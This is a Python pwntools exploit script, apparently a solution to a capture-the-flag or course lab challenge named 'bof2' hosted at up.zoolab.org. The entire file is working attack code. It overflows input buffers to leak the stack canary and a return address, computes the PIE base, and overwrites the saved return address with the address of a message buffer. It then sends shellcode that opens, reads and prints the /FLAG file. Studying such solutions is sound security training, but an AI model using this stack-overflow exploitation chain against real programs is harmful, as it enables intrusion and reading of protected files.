#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *
import sys

context.arch = 'amd64'
context.os = 'linux'

exe = './bof2'
port = 12343

elf = ELF(exe)
base = 0
qemu_base = 0

r = None
if 'local' in sys.argv[1:]:
    r = process(exe, shell=False)
elif 'qemu' in sys.argv[1:]:
    qemu_base = 0x4000000000
    r = process(f'qemu-x86_64-static {exe}', shell=True)
else:
    r = remote('up.zoolab.org', port)

sc  = shellcraft.openat(-100, "/FLAG", 0, 0)
sc += shellcraft.read('rax', 'rsp', 0x100)
sc += shellcraft.write(1, 'rsp', 'rax')
sc += shellcraft.exit(0)

shellcode = asm(sc)
leak_message = b'A' * (0x90 - 8 + 1)

r.recvuntil(b"What's your name? ")
r.send(leak_message)
r.recvuntil(leak_message)

canary = r.recvuntil(b'\n').rstrip(b'\n')

real_canary_bytes = b'\x00' + canary[:7]

real_canary = int.from_bytes(real_canary_bytes, 'little')

leak_message = b'A' * (0x60 + 8)

r.recvuntil(b"What's the room number? ")
r.send(leak_message)
r.recvuntil(leak_message)

ret_addr = r.recvuntil(b'\n').rstrip(b'\n')

ret_addr = int.from_bytes(ret_addr, byteorder='little')

pie_base = ret_addr - 0x9cbc

msg_addr = pie_base + 0xef220

msg_addr_bytes = msg_addr.to_bytes(8, byteorder='little')

leak_message = b'A' * (0x30 - 8) + real_canary_bytes + b'A' * 8  + msg_addr_bytes

r.recvuntil(b"What's the customer's name? ")
r.send(leak_message)

data = r.recv()

r.recvuntil(b"Leave your message: ")
r.send(shellcode)

r.recvuntil(b"Thank you!\n")
flag = r.recv()
print(flag)
# vim: set tabstop=4 expandtab shiftwidth=4 softtabstop=4 number cindent fileencoding=utf-8 :